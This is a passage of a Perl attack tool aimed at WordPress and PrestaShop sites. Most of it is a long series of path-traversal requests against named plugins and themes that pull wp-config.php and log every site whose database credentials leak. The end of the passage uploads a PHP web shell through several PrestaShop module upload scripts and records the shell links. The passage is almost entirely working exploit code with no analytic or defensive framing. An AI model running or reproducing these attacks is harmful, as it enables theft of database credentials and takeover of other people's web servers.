    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################
sub History(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"History-collection ................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

sub Imageex(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Image-export ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/image-export/download.php?file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	
	
	
sub kbslider(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"kbslider_show_image ............... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

	
	
sub Linenity(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Linenity .......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
sub Lote27(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Lote27 ............................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/lote27/download.php?download=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
sub Markant(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Markant ........................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/markant/download.php?file=../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
sub MichaelCanthony(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"MichaelCanthony ................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
sub mTheme(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"mTheme-Unus ....................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub NativeChurch(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"NativeChurch ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

sub Parallelus(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Parallelus-Salutation ............. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
sub RedSteel(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"RedSteel .......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN ";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
sub Revsliderss(){             
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Revslider ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
####################################################################################################

	
sub S3bubble(){             
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"S3bubble-amazon-s3-html-5 ......... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub SMWF(){             
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"SMWF .............................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
sub TheLoft(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"TheLoft ........................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

sub Trinity(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Trinity ........................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	
####################################################################################################
	
sub Urbancity(){             
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Urbancity ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
sub Yakimabait(){            
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Yakimabait ........................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/yakimabait/download.php?file=./wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	
sub Membership(){          
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Membership Simplified v1.58 ....... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
sub FileManagerwp(){             
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Wp-FileManager .................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub Googlemp3(){             
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Google-mp3-audio-player ........... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
sub Justifiedim(){           
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Justified-image-grid 1 ............ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub Justified2(){           
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Justified-image-grid 2 ............ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub Justified3(){            
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Justified-image-grid 3 ............ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
sub Aspose(){            
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Aspose-cloud-ebook-generator ...... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	

	####################################################################################################

	
	
sub Asposedoc(){           
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Aspose-doc-exporter ............... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub MiwoFTP(){             
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"MiwoFTP 1.0.5  1 .................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub MiwoFTP2(){          
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"MiwoFTP 1.0.5  2 .................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	
sub miniaudioplayer(){          
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Wp-miniaudioplayer ................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub Ypotheme(){           
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Ypo-theme ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
	
sub Media14(){           
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"N-Media 1.4 ....................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/website-contact-form-with-file-upload/config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

sub wpmon(){  
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Wp-mon ............................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
sub mapprolbs(){ 
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Ibs-mappro ........................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Success";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}


####################################################################################################

######################################################
#################### PrestaShoP ######################
######################################################

################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/Xploit.php";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"columnadverts";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $columnadvertsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$columnadvertsup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"columnadverts";
print color('bold white')," ..................... ";
print color('bold red'),"NOT VULN\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/Xploit.php";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"soopamobile";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $soopamobileup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$soopamobileup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"soopamobile";
print color('bold white')," ....................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);
$soopabannersup="$site/modules/soopabanners/slides/Xploit.php";
my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"soopabanners";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $soopabannersup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$soopabannersup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"soopabanners";
print color('bold white')," ...................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/Xploit.php";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/X Xploit/) {
